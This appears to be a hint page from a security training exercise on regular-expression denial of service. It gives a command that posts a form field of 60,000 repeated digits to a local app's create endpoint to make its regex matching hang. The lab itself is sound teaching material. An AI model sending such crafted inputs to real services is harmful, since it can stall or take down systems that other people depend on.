# Hint 3

Let’s ramp it up further. Note: You do not need to go higher than 60,000 to achieve a ReDoS.

```
$ echo 'content=Buy milk in '`printf %.0s5 {1..60000}`' minutes' | http --form http://localhost:3001/create -v
```
